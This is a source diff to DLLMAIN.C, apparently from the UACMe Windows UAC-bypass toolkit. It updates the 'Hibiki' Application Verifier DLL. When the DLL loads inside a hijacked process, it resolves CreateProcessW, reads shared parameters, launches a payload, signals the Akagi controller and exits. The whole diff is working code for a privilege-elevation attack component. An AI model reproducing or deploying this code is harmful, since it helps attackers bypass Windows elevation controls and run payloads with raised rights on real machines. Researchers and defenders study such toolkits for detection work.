@@ -4,9 +4,9 @@
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     3.03
+*  VERSION:     3.10
 *
-*  DATE:        11 Oct 2018
+*  DATE:        11 Nov 2018
 *
 *  AVrf entry point, Hibiki Kai Ni.
 *
@@ -45,6 +45,8 @@ static HMODULE g_pvKernel32;
 
 PFNCREATEPROCESSW pCreateProcessW = NULL;
 
+UACME_PARAM_BLOCK g_SharedParams;
+
 /*
 * ucmLoadCallback
 *
@@ -60,10 +62,12 @@ VOID NTAPI ucmLoadCallback(
     PVOID Reserved
 )
 {
-    BOOL bReadSuccess, bIsLocalSystem = FALSE;
+    BOOL bSharedParamsReadOk;
+
+    NTSTATUS Status;
 
     PWSTR lpParameter = NULL;
-    ULONG cbParameter = 0L;
+    ULONG cbParameter = 0UL;
 
     UNREFERENCED_PARAMETER(DllSize);
     UNREFERENCED_PARAMETER(Reserved);
@@ -78,42 +82,51 @@ VOID NTAPI ucmLoadCallback(
 
     if (_strcmpi(DllName, L"user32.dll") == 0) {
         if (g_pvKernel32) {
-            
+
 #pragma warning(push)
 #pragma warning(disable: 4152)
 
             pCreateProcessW = ucmLdrGetProcAddress(
-                (PCHAR)g_pvKernel32, 
+                (PCHAR)g_pvKernel32,
                 "CreateProcessW");
 
 #pragma warning(pop)
 
             if (pCreateProcessW != NULL) {
 
-                ucmIsLocalSystem(&bIsLocalSystem);
-
-                bReadSuccess = ucmReadParameters(
-                    &lpParameter,
-                    &cbParameter,
-                    NULL,
-                    NULL,
-                    bIsLocalSystem);
-
-                ucmLaunchPayloadEx(
-                    pCreateProcessW,
-                    lpParameter,
-                    cbParameter);
-
-                if ((bReadSuccess) && 
-                    (lpParameter != NULL)) 
-                {
-                    RtlFreeHeap(
-                        NtCurrentPeb()->ProcessHeap,
-                        0,
-                        lpParameter);
+                //
+                // Read shared params block.
+                //
+                RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
+                bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
+                if (bSharedParamsReadOk) {
+                    lpParameter = g_SharedParams.szParameter;
+                    cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
+                }
+                else {
+                    lpParameter = NULL;
+                    cbParameter = 0UL;
                 }
 
-                NtTerminateProcess(NtCurrentProcess(), STATUS_SUCCESS);
+                if (ucmLaunchPayloadEx(
+                    pCreateProcessW,
+                    lpParameter,
+                    cbParameter))
+                {
+                    Status = STATUS_SUCCESS;
+                }
+                else {
+                    Status = STATUS_UNSUCCESSFUL;
+                }
+
+                //
+                // Notify Akagi.
+                //
+                if (bSharedParamsReadOk) {
+                    ucmSetCompletion(g_SharedParams.szSignalObject);
+                }
+
+                NtTerminateProcess(NtCurrentProcess(), Status);
             }
         }
     }
